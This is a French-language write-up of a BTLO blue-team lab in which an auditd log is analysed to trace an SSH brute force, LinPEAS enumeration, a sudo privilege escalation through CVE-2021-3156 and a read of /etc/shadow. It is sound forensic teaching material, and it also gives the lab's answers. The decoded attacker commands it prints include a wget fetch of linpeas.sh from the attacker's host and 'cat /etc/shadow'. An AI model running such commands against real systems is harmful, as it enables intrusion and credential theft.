# 🔐 BTLO — Paranoid | Audit Log Analysis Writeup

## 📋 Scenario

> Analyse d’un fichier `audit.log` provenant d’un système compromis.  
> L’objectif est d’identifier les actions de l’attaquant, son accès initial, son élévation de privilèges et les données exfiltrées.

**Fichiers fournis :**
```
paranoid.zip/
└── Challenge Files/
  └── audit.log
```

> 💡 Challenge relativement complexe basé sur l’analyse de logs Linux (`auditd`).

---

## 🧠 Méthodologie

Pour analyser le fichier `audit.log`, utilisation de l’outil :

- `aureport` → résumé des événements auditd
- `grep` → filtrage précis des événements
- `xxd` → décodage hexadécimal des commandes (`PROCTITLE`)

---

## ❓ Questions & Réponses

---

### Q1 — What account was compromised?

**Réponse : `btlo`**

Commande utilisée :

```bash
sudo aureport -if audit.log -au
```

Options :
- `-if` → fichier d’entrée
- `-au` → rapport d’authentification

Extrait pertinent :

```
89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
90. 10/05/21 02:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442
```

👉 Le compte compromis est **btlo**

---

### Q2 — What attack type was used to gain initial access?

**Réponse : `Brute Force`**

Commande :

```bash
aureport -if audit.log
```

Résultats :

```
Number of failed logins: 87
Number of authentications: 3
Number of failed authentications: 89
```

👉 Un grand nombre d’échecs indique une attaque **bruteforce**

---

### Q3 — What is the attacker's IP address?

**Réponse : `192.168.4.155`**

Toujours avec :

```bash
sudo aureport -if audit.log -au
```

Extrait :

```
10/05/21 02:23:13 btlo 192.168.4.155 ssh
```

👉 IP attaquante identifiée

---

### Q4 — What tool was used to perform system enumeration?

**Réponse : `LinPEAS`**

Détection via un téléchargement suspect :

```
/usr/bin/wget pts1 192.168.4.155 1001 468454
```

Analyse de l’event ID :

```bash
grep -A5 "468454" audit.log
```

Résultat :

```
proctitle=77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368
```

Décodage :

```bash
echo "77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368" | xxd -r -p
```

Résultat :

```
wget -O - http://192.168.4.155:8000/linpeas.sh
```

👉 L’outil utilisé est **LinPEAS**

---

### Q5 — What is the name of the binary and pid used to gain root?

**Réponse : `evil,829992`**

Identification de la session attaquant :

```
ses=49
```

Recherche des commandes sudo réussies :

```bash
grep "ses=49" audit.log | grep "sudo" | grep "res=success"
```

👉 PID root : **829992**

Analyse autour de l’événement :

```bash
grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="
```

Résultat :

```
proctitle=2E2F6576696C0030
```

Décodage :

```bash
echo "2E2F6576696C0030" | xxd -r -p
```

Résultat :

```
./evil0
```

👉 Binaire utilisé : **evil**

---

### Q6 — What CVE was exploited to gain root access?

**Réponse : `CVE-2021-3156`**

Indice trouvé :

```
comm="sudoedit"
```

👉 Vulnérabilité connue liée à `sudo`

Recherche → correspond à :

- CVE-2021-3156 (Baron Samedit)

---

### Q7 — What type of vulnerability is this?

**Réponse : `Heap-Based Buffer Overflow`**

👉 Type confirmé par la CVE :

- Dépassement de tampon sur le heap dans `sudo`

---

### Q8 — What file was exfiltrated once root was gained?

**Réponse : `/etc/shadow`**

Commande utilisée :

```bash
grep "481063" audit.log | grep "EXECVE"
```

Résultat :

```
type=EXECVE msg=audit(...): argc=2 a0="cat" a1="/etc/shadow"
```

👉 Fichier sensible exfiltré

---

## 🛠️ Outils utilisés

| Outil | Usage |
|-------|------|
| `aureport` | Analyse des logs auditd |
| `grep` | Filtrage des événements |
| `xxd` | Décodage hexadécimal |
| `wget` | (attaquant) téléchargement de payload |

---

## 📚 Ressources

- https://www.sentinelone.com/vulnerability-database/cve-2021-3156/
- https://nvd.nist.gov/vuln/detail/cve-2021-3156
